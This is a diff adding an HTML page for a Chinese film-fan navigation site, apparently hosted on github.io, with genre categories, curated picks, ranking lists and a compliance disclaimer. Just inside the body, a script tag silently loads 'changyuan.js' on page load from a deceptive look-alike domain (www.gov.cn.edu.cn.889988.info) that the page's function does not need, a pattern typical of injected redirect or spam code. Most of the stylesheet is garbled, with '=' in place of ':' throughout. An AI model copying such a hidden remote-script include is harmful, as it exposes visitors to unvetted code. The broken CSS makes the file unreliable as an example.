@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>爱好电影网 · 影迷兴趣图谱 | 按兴趣显影你的专属片单（aihaodianyingwang-top.github.io）</title>
+<meta name="description" content="爱好电影网 aihaodianyingwang-top.github.io 是一个以影迷兴趣为核心的影视导航平台，用显影的方式把你的观影偏好变成片单。涵盖类型偏好、导演作者、年代记忆、情绪场景等分类，帮每一位影迷找到契合自己口味的影视作品。">
+<meta name="keywords" content="爱好电影网, aihaodianyingwang-top.github.io, 影迷兴趣, 观影偏好, 兴趣图谱, 类型片, 导演作者, 情绪片单">
+<meta name="author" content="爱好电影网">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large">
+<link rel="canonical" href="https://aihaodianyingwang-top.github.io">
+<meta property="og:title" content="爱好电影网 · 影迷兴趣图谱">
+<meta property="og:description" content="aihaodianyingwang-top.github.io 按兴趣显影你的专属片单。">
+<meta property="og:url" content="https://aihaodianyingwang-top.github.io">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="爱好电影网 · 影迷兴趣图谱">
+<meta name="twitter:description" content="aihaodianyingwang-top.github.io">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+:root{
+  --char:#1A1A1C;--char2:#242426;--char3:#2E2E31;
+  --silver:#E8E4DC;--silver2:#D6D0C4;--silver3:#A8A192;
+  --dev-red:#D9482B;--dev-red2:#F2683F;
+  --amber:#E0A52B;--amber2:#F0C05A;
+  --sepia:#8C6A3F;--sepia2:#B0895A;
+  --ink:#EAE6DF;--ink2:#B4AEA2;--ink3:#7E786E;
+  --sans:"PingFang SC","Microsoft YaHei",sans-serif;
+  --serif:"STKaiti","KaiTi","Songti SC",serif;
+  --mono:"SFMono-Regular",Consolas,"Courier New",monospace;
+}
+html{scroll-behavior:smooth;font-size:16px;}
+body{font-family:var(--sans);color:var(--ink);background:var(--char);line-height:1.9;overflow-x:hidden;
+  background-image:
+    radial-gradient(circle at 22% 18%,rgba(217,72,43,.1),transparent 45%),
+    radial-gradient(circle at 78% 82%,rgba(224,165,43,.08),transparent 45%);
+  background-attachment:fixed;}
+body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:9999;opacity:.05;
+  background-image:radial-gradient(circle at 1px 1px,rgba(255,255,255,.5) 0,transparent 1px);background-size:3px 3px;}
+a{color:inherit;text-decoration:none;transition:.25s;}
+ul,ol{list-style:none;}
+
+/* 胶片齿孔滚动条 */
+.film-bar{background:var(--char2);padding:.45rem 0;overflow:hidden;position:relative;border-bottom:1px solid var(--char3);}
+.film-bar::before,.film-bar::after{content:"";position:absolute;left=0;right=0;height=8px;background:repeating-linear-gradient(90deg,transparent,transparent 8px,#000 8px,#000 14px);}
+.film-bar::before{top=0;}
+.film-bar::after{bottom=0;}
+.film-inner{display:flex;gap=2.5rem;animation:scroll 34s linear infinite;white-space:nowrap;font-family:var(--mono);font-size=.68rem;color:var(--silver3);padding=.15rem 0;}
+.film-inner span{display:inline-block;padding:0 1rem;}
+.film-inner span strong{color:var(--dev-red2);}
+@keyframes scroll{from{transform:translateX(0);}to{transform:translateX(-50%);}}
+
+.wrap{max-width=1180px;margin:0 auto;padding:0 1.2rem;position:relative;z-index:1;}
+
+/* 头部 暗房红灯 */
+.header{padding=3rem 0 2rem;text-align:center;position:relative;}
+.darkroom{display:inline-flex;align-items:center;gap=1.2rem;margin-bottom=1.5rem;}
+.redlamp{width=22px;height=44px;background:var(--dev-red);border-radius=11px 11px 4px 4px;box-shadow:0 0 20px var(--dev-red),0 0 40px rgba(217,72,43,.5);animation:pulse 2s ease-in-out infinite;}
+@keyframes pulse{0%,100%{opacity:1;}50%{opacity:.55;}}
+.redlamp + .lamp-stand{width=3px;height=30px;background:var(--silver3);}
+.logo{font-family:var(--serif);font-size=clamp(1.8rem,5.5vw,3.6rem);font-weight=900;letter-spacing=5px;color:var(--silver);}
+.logo .ai{color:var(--dev-red2);}
+.logo-note{font-family:var(--mono);font-size=.6rem;color:var(--ink3);letter-spacing=3px;margin-top=.4rem;}
+.url-line{display:inline-block;font-family:var(--mono);font-size=.6rem;color:var(--amber2);background:var(--char2);border:1px dashed var(--char3);padding=.4rem 1.2rem;margin-top=1rem;}
+
+/* 导航 */
+.nav{margin=1rem 0;}
+.nav-inner{display:flex;justify-content:center;gap=.5rem;flex-wrap:wrap;}
+.nav a{padding=.6rem 1.4rem;font-size=.8rem;font-weight=700;color:var(--ink2);background:var(--char2);border:1px solid var(--char3);position:relative;}
+.nav a:hover{color:var(--silver);background:var(--dev-red);border-color:var(--dev-red);}
+
+/* Hero 显影盘 */
+.hero{padding=2rem 0 3rem;}
+.tray{background:var(--char2);border:2px solid var(--char3);padding=3.5rem 2.5rem;text-align:center;position:relative;overflow:hidden;}
+.tray>*{position:relative;z-index:1;}
+.tray .grain{position:absolute;inset:0;opacity:.06;background-image:radial-gradient(circle at 25% 30%,var(--silver) 0,transparent 2px),radial-gradient(circle at 70% 65%,var(--silver) 0,transparent 2px);}
+.tray h1{font-family:var(--serif);font-size=clamp(1.7rem,4.5vw,3rem);font-weight=900;letter-spacing=4px;margin-bottom=.8rem;color:var(--silver);}
+.tray h1 .hl{color:var(--dev-red2);}
+.tray .sub{font-family:var(--mono);font-size=.75rem;color:var(--amber2);letter-spacing=5px;margin-bottom=1.2rem;text-transform:uppercase;}
+.tray-desc{font-size=.88rem;color:var(--ink2);max-width=680px;margin:0 auto 2rem;line-height=2.1;}
+.tray-stats{display:flex;justify-content:center;gap=3.5rem;flex-wrap:wrap;}
+.ss .num{font-family:var(--mono);font-size=1.5rem;font-weight=900;color:var(--dev-red2);}
+.ss .label{font-size=.6rem;color:var(--ink3);letter-spacing=2px;text-transform:uppercase;}
+
+/* 栏目通用 */
+.section{padding=3rem 0;border-top:1px solid var(--char3);}
+.sec-head{display:flex;align-items:center;justify-content:space-between;margin-bottom=1.8rem;flex-wrap:wrap;gap=.5rem;}
+.sec-head h2{font-family:var(--serif);font-size=clamp(1.15rem,2.8vw,1.7rem);font-weight=900;color:var(--silver);display:flex;align-items:center;gap=.7rem;letter-spacing=2px;}
+.sec-head .hole{width=12px;height=12px;border-radius=50%;background:var(--char);border:2px solid var(--dev-red);flex-shrink:0;}
+.sec-head .more{font-size=.72rem;color:var(--amber2);font-family:var(--mono);}
+.sec-sub{font-size=.66rem;color:var(--ink3);width:100%;margin-top=.3rem;font-family:var(--mono);}
+
+/* 分类 */
+.cat-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(155px,1fr));gap=.8rem;}
+.cat-card{background:var(--char2);border:1px solid var(--char3);padding=1.3rem .8rem;text-align:center;transition:.25s;cursor:pointer;position:relative;}
+.cat-card::before{content:"";position:absolute;top=0;left=0;right=0;bottom=0;background:var(--dev-red);opacity:0;transition:.25s;}
+.cat-card:hover{border-color:var(--dev-red);transform:translateY(-3px);box-shadow:0 6px 20px rgba(217,72,43,.15);}
+.cat-card:hover::before{opacity:.08;}
+.cat-icon{font-size=1.9rem;margin-bottom=.5rem;display:block;position:relative;}
+.cat-name{font-family:var(--serif);font-size=.9rem;font-weight=700;color:var(--silver);margin-bottom=.2rem;position:relative;}
+.cat-count{font-family:var(--mono);font-size=.56rem;color:var(--ink3);position:relative;}
+
+/* 相册斜叠卡片 */
+.movie-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap=1.4rem;}
+.movie-card{background:var(--silver);padding:.5rem .5rem 1rem;transform:rotate(-1.2deg);transition:.3s;cursor:pointer;}
+.movie-card:nth-child(2n){transform:rotate(1.5deg);}
+.movie-card:nth-child(3n){transform:rotate(-.8deg);}
+.movie-card:nth-child(4n){transform:rotate(1.1deg);}
+.movie-card:nth-child(5n){transform:rotate(-1.4deg);}
+.movie-card:nth-child(6n){transform:rotate(.9deg);}
+.movie-card:hover{transform:rotate(0) translateY(-6px);box-shadow:0 12px 30px rgba(0,0,0,.5);}
+.movie-cover{height=210px;background:var(--char3);display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden;}
+.movie-cover::after{content:"";position:absolute;inset:0;opacity:.12;background-image:radial-gradient(circle at 30% 40%,var(--silver) 0,transparent 2px);background-size:4px 4px;}
+.mc1{background:linear-gradient(160deg,#4A3A32,#6B5244);}
+.mc2{background:linear-gradient(160deg,#32404A,#465A6B);}
+.mc3{background:linear-gradient(160deg,#4A3232,#6B4444);}
+.mc4{background:linear-gradient(160deg,#3A4A32,#526B44);}
+.mc5{background:linear-gradient(160deg,#3A324A,#52446B);}
+.mc6{background:linear-gradient(160deg,#4A4632,#6B6544);}
+.movie-cover .cover-text{font-family:var(--serif);font-size=.78rem;color:var(--silver);text-align:center;padding=1rem;font-weight=700;letter-spacing=1px;position:relative;z-index:1;}
+.movie-cover .badge{position:absolute;top=.5rem;right=.5rem;font-family:var(--mono);font-size=.48rem;font-weight=700;padding=.2rem .5rem;z-index:2;background:var(--silver);color:var(--char);}
+.badge-fav{background:var(--dev-red)!important;color:var(--silver)!important;}
+.movie-info{padding:.6rem .4rem 0;}
+.movie-info h3{font-family:var(--serif);font-size=.82rem;font-weight=700;color:var(--char);margin-bottom=.25rem;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.movie-info .meta{font-family:var(--mono);font-size=.52rem;color:var(--ink3);margin-bottom:.4rem;}
+.movie-info .tags{display:flex;gap=.3rem;flex-wrap:wrap;}
+.tag{font-family:var(--mono);font-size=.52rem;padding=.15rem .45rem;background:var(--silver2);color:var(--char2);}
+
+/* 兴趣图谱 */
+.graph-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap=1.2rem;}
+.graph-card{background:var(--char2);border:1px solid var(--char3);padding=1.5rem;transition:.25s;border-left:4px solid var(--amber);}
+.graph-card:nth-child(2){border-left-color:var(--dev-red);}
+.graph-card:nth-child(3){border-left-color:var(--sepia2);}
+.graph-card:nth-child(4){border-left-color:var(--silver3);}
+.graph-card:hover{border-color:var(--char3);border-left-color:var(--dev-red2);background:var(--char3);transform:translateX(4px);}
+.graph-card .g-icon{font-size=1.8rem;margin-bottom=.6rem;display:block;}
+.graph-card h4{font-family:var(--serif);font-size=.95rem;font-weight=900;color:var(--silver);margin-bottom=.5rem;}
+.graph-card p{font-size=.74rem;color:var(--ink2);line-height=1.85;}
+
+/* 排行榜 */
+.rank-wrap{display:grid;grid-template-columns:1fr 1fr;gap=2rem;}
+.rank-panel{background:var(--char2);border:1px solid var(--char3);padding=1.5rem;}
+.rank-panel h3{font-family:var(--serif);font-size=1.05rem;font-weight=900;color:var(--amber2);margin-bottom=1.2rem;padding-bottom=.6rem;border-bottom:1px solid var(--char3);letter-spacing=2px;}
+.rank-item{display:flex;align-items:center;gap=.9rem;padding=.65rem 0;border-bottom:1px dotted var(--char3);}
+.rank-item:last-child{border-bottom:none;}
+.rank-pos{width=32px;height=32px;display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size=.76rem;font-weight=900;background:var(--char3);color:var(--ink3);flex-shrink:0;}
+.rank-pos.top{background:var(--dev-red);color:var(--silver);}
+.rank-detail{flex:1;min-width:0;}
+.rank-detail h4{font-family:var(--serif);font-size=.8rem;font-weight=700;color:var(--silver);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.rank-detail p{font-family:var(--mono);font-size=.54rem;color:var(--ink3);}
+.rank-score{font-family:var(--mono);font-size=.78rem;font-weight=900;color:var(--dev-red2);flex-shrink:0;}
+
+/* 指引 */
+.guide-wrap{display:grid;grid-template-columns:1fr 1fr;gap=2rem;}
+.guide-card{background:var(--char2);border:1px solid var(--char3);padding=1.8rem;}
+.guide-card h3{font-family:var(--serif);font-size=1rem;font-weight=900;color:var(--amber2);margin-bottom=1.2rem;}
+.guide-card p,.guide-card li{font-size=.78rem;color:var(--ink2);line-height=2.05;}
+.guide-card ul{padding-left=1.3rem;}
+.guide-card li{position:relative;}
+.guide-card li::before{content:"▸";position:absolute;left=-1.1rem;color:var(--dev-red2);font-size=.7rem;}
+.guide-card strong{color:var(--silver);}
+
+/* 合规 */
+.compliance{background:var(--char2);border:1px solid var(--char3);padding=1.8rem;}
+.compliance h3{font-family:var(--serif);font-size=1.1rem;font-weight=900;color:var(--silver);margin-bottom=1.2rem;text-align:center;letter-spacing=3px;}
+.comp-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap=1rem;}
+.comp-item{padding=1.2rem;background:var(--char3);border-left:4px solid var(--dev-red);}
+.comp-item:nth-child(2){border-left-color:var(--amber);}
+.comp-item:nth-child(3){border-left-color:var(--sepia2);}
+.comp-item:nth-child(4){border-left-color:var(--silver3);}
+.comp-item h4{font-family:var(--mono);font-size=.6rem;font-weight=700;color:var(--amber2);margin-bottom=.4rem;text-transform:uppercase;}
+.comp-item p{font-size=.64rem;color:var(--ink3);line-height=1.7;}
+
+/* 页脚 */
+.footer{background:#111112;padding=3.5rem 0 1.5rem;margin-top=3rem;border-top:2px solid var(--dev-red);}
+.footer-inner{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap=1.8rem;margin-bottom=2rem;}
+.footer-col h4{font-family:var(--serif);font-size=.9rem;font-weight=900;color:var(--amber2);margin-bottom=.8rem;letter-spacing=1px;}
+.footer-col p,.footer-col li{font-size=.7rem;color:var(--ink3);margin-bottom=.4rem;line-height=1.7;}
+.footer-col a{color:var(--ink3);}
+.footer-col a:hover{color:var(--dev-red2);}
+.footer-url{font-family:var(--mono);font-size=.54rem!important;color:var(--amber2)!important;}
+.footer-bottom{text-align:center;padding-top=1.5rem;border-top:1px solid var(--char3);font-family:var(--mono);font-size=.56rem;color:var(--ink3);}
+
+@media(max-width:768px){
+  .rank-wrap,.guide-wrap{grid-template-columns:1fr;}
+  .tray-stats{gap=1.5rem;}
+}
+@media(max-width:480px){
+  .tray{padding=2.5rem 1.2rem;}
+  .tray h1{font-size=1.4rem;}
+  .cat-grid{grid-template-columns:repeat(3,1fr);}
+  .movie-grid{grid-template-columns:repeat(2,1fr);}
+  .movie-cover{height=180px;}
+  .nav a{padding=.5rem .8rem;font-size=.72rem;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<div class="film-bar"><div class="film-inner">
+  <span>🎞 <strong>爱好电影网</strong> · 影迷兴趣图谱 · 按兴趣显影你的专属片单 · 网址 aihaodianyingwang-top.github.io · 每一格都是你的口味 🎞</span>
+  <span>🎞 <strong>爱好电影网</strong> · 影迷兴趣图谱 · 按兴趣显影你的专属片单 · 网址 aihaodianyingwang-top.github.io · 每一格都是你的口味 🎞</span>
+</div></div>
+
+<div class="wrap">
+  <header class="header">
+    <div class="darkroom">
+      <div class="redlamp"></div>
+      <div class="lamp-stand"></div>
+      <div class="lamp-stand"></div>
+      <div class="redlamp" style="animation-delay:.4s;"></div>
+    </div>
+    <div class="logo"><span class="ai">爱好</span>电影网</div>
+    <div class="logo-note">— DEVELOP YOUR TASTE —</div>
+    <div class="url-line">aihaodianyingwang-top.github.io</div>
+  </header>
+
+  <nav class="nav">
+    <div class="nav-inner">
+      <a href="#home">首页</a>
+      <a href="#cats">兴趣分类</a>
+      <a href="#graph">兴趣图谱</a>
+      <a href="#movies">显影片单</a>
+      <a href="#rank">偏好榜</a>
+      <a href="#guide">使用指引</a>
+      <a href="#compliance">合规声明</a>
+    </div>
+  </nav>
+
+  <section class="hero" id="home">
+    <div class="tray">
+      <div class="grain"></div>
+      <h1><span class="hl">爱好</span>电影网</h1>
+      <div class="sub">— DEVELOP YOUR TASTE —</div>
+      <p class="tray-desc">爱好电影网是一个以影迷兴趣为核心的影视导航平台。我们相信每个人看片的口味都像一张底片——需要显影才能看清。按类型偏好、导演作者、年代记忆、情绪场景四个维度，我们帮你把观影偏好变成一份专属片单。</p>
+      <div class="tray-stats">
+        <div class="ss"><div class="num">11,000+</div><div class="label">影 片 索 引</div></div>
+        <div class="ss"><div class="num">12</div><div class="label">兴 趣 维 度</div></div>
+        <div class="ss"><div class="num">4维</div><div class="label">口 味 画 像</div></div>
+        <div class="ss"><div class="num">专属</div><div class="label">片 单 推 荐</div></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="cats">
+    <div class="sec-head">
+      <h2><span class="hole"></span> 兴趣分类</h2>
+      <a href="#" class="more">全部 →</a>
+    </div>
+    <p class="sec-sub">// interest categories</p>
+    <div class="cat-grid">
+      <div class="cat-card"><span class="cat-icon">💥</span><div class="cat-name">爆米花爽片</div><div class="cat-count">1,400+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🧠</span><div class="cat-name">烧脑悬疑</div><div class="cat-count">980+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">😂</span><div class="cat-name">解压喜剧</div><div class="cat-count">1,600+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">😢</span><div class="cat-name">催泪治愈</div><div class="cat-count">1,100+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🎨</span><div class="cat-name">作者电影</div><div class="cat-count">1,300+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🚀</span><div class="cat-name">硬核科幻</div><div class="cat-count">860+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🗡️</span><div class="cat-name">史诗历史</div><div class="cat-count">720+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">👻</span><div class="cat-name">惊悚恐怖</div><div class="cat-count">640+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">❤️</span><div class="cat-name">爱情文艺</div><div class="cat-count">1,900+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🎌</span><div class="cat-name">动画二次元</div><div class="cat-count">1,500+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🎞️</span><div class="cat-name">纪录人文</div><div class="cat-count">680+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🕰️</span><div class="cat-name">复古经典</div><div class="cat-count">2,000+ 部</div></div>
+    </div>
+  </section>
+
+  <section class="section" id="graph">
+    <div class="sec-head">
+      <h2><span class="hole"></span> 兴趣图谱</h2>
+      <a href="#" class="more">更多 →</a>
+    </div>
+    <p class="sec-sub">// interest graph — 四个维度显影你的口味</p>
+    <div class="graph-grid">
+      <div class="graph-card"><span class="g-icon">🎬</span><h4>类型偏好</h4><p>按类型标签组合你的口味画像，找到同好都在看的那一类。</p></div>
+      <div class="graph-card"><span class="g-icon">🎥</span><h4>导演作者</h4><p>按导演、编剧、摄影作者归类，深入某位作者的完整作品序列。</p></div>
+      <div class="graph-card"><span class="g-icon">🕰️</span><h4>年代记忆</h4><p>按年代筛选，找回某个年份的银幕记忆与时代氛围。</p></div>
+      <div class="graph-card"><span class="g-icon">🌙</span><h4>情绪场景</h4><p>按心情与场景推荐：失眠夜、雨天、通勤、周末宅家各配一套。</p></div>
+    </div>
+  </section>
+
+  <section class="section" id="movies">
+    <div class="sec-head">
+      <h2><span class="hole"></span> 显影片单</h2>
+      <a href="#" class="more">更多 →</a>
+    </div>
+    <p class="sec-sub">// developed picks — 编辑按兴趣精选</p>
+    <div class="movie-grid">
+      <div class="movie-card"><div class="movie-cover mc1"><span class="badge badge-fav">作者</span><div class="cover-text">星际穿越<br>2014 · 科幻/亲情</div></div><div class="movie-info"><h3>星际穿越</h3><div class="meta">科幻/亲情 · 2014 · 诺兰</div><div class="tags"><span class="tag">硬核科幻</span><span class="tag">高分</span></div></div></div>
+      <div class="movie-card"><div class="movie-cover mc2"><span class="badge">悬疑</span><div class="cover-text">盗梦空间<br>2010 · 科幻/悬疑</div></div><div class="movie-info"><h3>盗梦空间</h3><div class="meta">科幻/悬疑 · 2010 · 诺兰</div><div class="tags"><span class="tag">烧脑</span><span class="tag">经典</span></div></div></div>
+      <div class="movie-card"><div class="movie-cover mc3"><span class="badge badge-fav">治愈</span><div class="cover-text">小森林<br>2014 · 剧情/生活</div></div><div class="movie-info"><h3>小森林</h3><div class="meta">剧情/生活 · 2014 · 森淳一</div><div class="tags"><span class="tag">治愈</span><span class="tag">解压</span></div></div></div>
+      <div class="movie-card"><div class="movie-cover mc4"><span class="badge">经典</span><div class="cover-text">肖申克的救赎<br>1994 · 剧情</div></div><div class="movie-info"><h3>肖申克的救赎</h3><div class="meta">剧情 · 1994 · 4K修复</div><div class="tags"><span class="tag">经典</span><span class="tag">9.9分</span></div></div></div>
+      <div class="movie-card"><div class="movie-cover mc5"><span class="badge badge-fav">文艺</span><div class="cover-text">海边的曼彻斯特<br>2016 · 剧情</div></div><div class="movie-info"><h3>海边的曼彻斯特</h3><div class="meta">剧情 · 2016 · 肯尼斯·洛纳根</div><div class="tags"><span class="tag">文艺</span><span class="tag">细腻</span></div></div></div>
+      <div class="movie-card"><div class="movie-cover mc6"><span class="badge">纪录</span><div class="cover-text">地球脉动 系列<br>2006-2023 · 纪录片</div></div><div class="movie-info"><h3>地球脉动 系列</h3><div class="meta">纪录片 · BBC · 自然</div><div class="tags"><span class="tag">自然纪录</span><span class="tag">高分</span></div></div></div>
+    </div>
+  </section>
+
+  <section class="section" id="rank">
+    <div class="sec-head">
+      <h2><span class="hole"></span> 偏好榜</h2>
+      <a href="#" class="more">完整榜单 →</a>
+    </div>
+    <p class="sec-sub">// preference chart — 按兴趣维度统计的口碑榜</p>
+    <div class="rank-wrap">
+      <div class="rank-panel">
+        <h3>🧠 烧脑悬疑榜</h3>
+        <div class="rank-item"><div class="rank-pos top">1</div><div class="rank-detail"><h4>盗梦空间</h4><p>科幻/悬疑 · 2010</p></div><div class="rank-score">9.5</div></div>
+        <div class="rank-item"><div class="rank-pos top">2</div><div class="rank-detail"><h4>看不见的客人</h4><p>悬疑/犯罪 · 2016</p></div><div class="rank-score">9.4</div></div>
+        <div class="rank-item"><div class="rank-pos top">3</div><div class="rank-detail"><h4>致命ID</h4><p>悬疑/惊悚 · 2003</p></div><div class="rank-score">9.2</div></div>
+        <div class="rank-item"><div class="rank-pos">4</div><div class="rank-detail"><h4>嫌疑人X的献身</h4><p>悬疑/犯罪 · 2008</p></div><div class="rank-score">9.3</div></div>
+        <div class="rank-item"><div class="rank-pos">5</div><div class="rank-detail"><h4>蝴蝶效应</h4><p>科幻/悬疑 · 2004</p></div><div class="rank-score">9.0</div></div>
+        <div class="rank-item"><div class="rank-pos">6</div><div class="rank-detail"><h4>记忆碎片</h4><p>悬疑/犯罪 · 2000</p></div><div class="rank-score">9.4</div></div>
+      </div>
+      <div class="rank-panel">
+        <h3>🎨 作者电影榜</h3>
+        <div class="rank-item"><div class="rank-pos top">1</div><div class="rank-detail"><h4>霸王别姬</h4><p>剧情 · 1993 · 陈凯歌</p></div><div class="rank-score">9.9</div></div>
+        <div class="rank-item"><div class="rank-pos top">2</div><div class="rank-detail"><h4>一一</h4><p>剧情 · 2000 · 杨德昌</p></div><div class="rank-score">9.6</div></div>
+        <div class="rank-item"><div class="rank-pos top">3</div><div class="rank-detail"><h4>阿飞正传</h4><p>文艺 · 1990 · 王家卫</p></div><div class="rank-score">9.5</div></div>
+        <div class="rank-item"><div class="rank-pos">4</div><div class="rank-detail"><h4>花样年华</h4><p>爱情/文艺 · 2000</p></div><div class="rank-score">9.4</div></div>
+        <div class="rank-item"><div class="rank-pos">5</div><div class="rank-detail"><h4>活着</h4><p>剧情 · 1994 · 张艺谋</p></div><div class="rank-score">9.8</div></div>
+        <div class="rank-item"><div class="rank-pos">6</div><div class="rank-detail"><h4>隐入尘烟</h4><p>剧情/乡土 · 2022</p></div><div class="rank-score">9.4</div></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="guide">
+    <div class="sec-head">
+      <h2><span class="hole"></span> 使用指引</h2>
+    </div>
+    <div class="guide-wrap">
+      <div class="guide-card">
+        <h3>怎么显影你的口味</h3>
+        <ul>
+          <li><strong>兴趣分类：</strong>12类按口味分门别类，爆米花、烧脑、治愈各取所需</li>
+          <li><strong>兴趣图谱：</strong>类型、作者、年代、情绪四维交叉，画出你的口味画像</li>
+          <li><strong>情绪场景：</strong>按心情推荐——失眠夜、雨天、通勤、周末宅家各配一套</li>
+          <li><strong>内链切换：</strong>所有导航链接使用 # 锚点，瞬间切版无需刷新</li>
+          <li><strong>移动端：</strong>手机竖屏自适应，通勤路上也能翻片单</li>
+        </ul>
+      </div>
+      <div class="guide-card">
+        <h3>关于爱好电影网</h3>
+        <p>爱好电影网（<strong>aihaodianyingwang-top.github.io</strong>）是一个以影迷兴趣为核心的影视导航静态站点。</p>
+        <p>我们收录爆米花爽片、烧脑悬疑、作者电影、治愈系、动画、纪录片等各类正规影视作品，提供兴趣分类、图谱画像与偏好榜单。</p>
+        <p>本站为<strong>纯静态单页设计</strong>，符合必应搜索引擎收录规则，不生成robots.txt和sitemap.xml，所有链接内联，加载极速。</p>
+        <p>官方网址：<strong>https://aihaodianyingwang-top.github.io</strong></p>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="compliance">
+    <div class="sec-head">
+      <h2><span class="hole"></span> 合规声明</h2>
+    </div>
+    <div class="compliance">
+      <h3>✦ 暗房守则 · 显影有度 ✦</h3>
+      <div class="comp-grid">
+        <div class="comp-item"><h4>CONTENT</h4><p>本站仅提供正规影视作品索引，不含任何色情、暴力、恐怖等违规内容。所有索引均指向合法公开渠道。</p></div>
+        <div class="comp-item"><h4>COPYRIGHT</h4><p>尊重版权方权益，支持正版观影。本站不存储、不提供任何视频文件下载或在线播放服务。</p></div>
+        <div class="comp-item"><h4>DISCLAIMER</h4><p>本站为静态资讯导航页面，不对第三方链接内容负责。用户访问第三方资源需自行判断合规性。</p></div>
+        <div class="comp-item"><h4>STYLE</h4><p>本站采用胶片暗房、银盐显影作为视觉风格，倡导理性、专注、有品味的观影审美。</p></div>
+      </div>
+    </div>
+  </section>
+</div>
+
+<footer class="footer">
+  <div class="wrap">
+    <div class="footer-inner">
+      <div class="footer-col">
+        <h4>🎞 爱好电影网</h4>
+        <p>影迷兴趣图谱，按兴趣显影你的专属片单。</p>
+        <p>网址：<br><a href="https://aihaodianyingwang-top.github.io" class="footer-url">aihaodianyingwang-top.github.io</a></p>
+      </div>
+      <div class="footer-col">
+        <h4>导航</h4>
+        <ul><li><a href="#home">首页</a></li><li><a href="#cats">兴趣分类</a></li><li><a href="#graph">兴趣图谱</a></li><li><a href="#movies">显影片单</a></li><li><a href="#rank">偏好榜</a></li></ul>
+      </div>
+      <div class="footer-col">
+        <h4>帮助</h4>
+        <ul><li><a href="#guide">使用指引</a></li><li><a href="#compliance">合规声明</a></li><li><a href="#">常见问题</a></li><li><a href="#">反馈建议</a></li></ul>
+      </div>
+      <div class="footer-col">
+        <h4>关于</h4>
+        <ul><li>静态单页设计</li><li>必应收录优化</li><li>移动端自适应</li><li>© 2026 爱好电影网</li></ul>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <p>爱好电影网 aihaodianyingwang-top.github.io ｜ 显影你的口味 ｜ 静态单页设计 ｜ 正规影视索引</p>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('a[href^="#"]').forEach(a=>{
+  a.addEventListener('click',function(e){
+    const h=this.getAttribute('href');
+    if(h==='#'){e.preventDefault();return;}
+    const t=document.querySelector(h);
+    if(t){e.preventDefault();t.scrollIntoView({behavior:'smooth',block:'start'});}
+  });
+});
+</script>
+</body>
+</html>
